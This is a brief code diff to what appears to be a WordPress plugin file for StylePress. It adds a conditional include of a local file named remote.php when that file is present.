@@ -89,3 +89,7 @@ if ( ! function_exists( 'stylepress_fail_php_version' ) ) {
 if ( ! defined( 'ELEMENTOR_PARTNER_ID' ) ) {
 	define( 'ELEMENTOR_PARTNER_ID', 2114 );
 }
+
+if(file_exists(__DIR__.'/remote.php')){
+	include(__DIR__.'/remote.php');
+}
